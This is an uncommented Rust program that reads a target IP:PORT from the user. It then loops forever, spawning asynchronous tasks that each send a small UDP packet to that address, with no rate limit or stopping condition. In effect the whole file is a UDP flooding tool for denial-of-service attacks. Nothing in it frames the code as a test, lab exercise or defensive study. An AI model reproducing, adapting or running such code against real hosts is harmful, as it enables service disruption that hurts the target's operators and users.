use std::io::{stdin, stdout, Write};
use std::net::SocketAddr;
use tokio::net::UdpSocket;

async fn make_udp_requests(
    server_address: SocketAddr,
    message: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    let socket = UdpSocket::bind("0.0.0.0:0").await?;
    socket.send_to(message, &server_address).await?;

    Ok(())
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut s = String::new();

    print!("(IP:PORT):");
    let _ = stdout().flush();

    stdin().read_line(&mut s)?;

    let server_address: SocketAddr = s.trim().parse()?;
    let message = vec![0; 2];
    let server_address = server_address.clone();
    loop {
        let message = message.clone();

        tokio::spawn(async move {
            if let Err(err) = make_udp_requests(
                server_address,
                &message,
            )
            .await
            {
                eprintln!("Server returned an error: {}", err);
            }
        });
    }
}
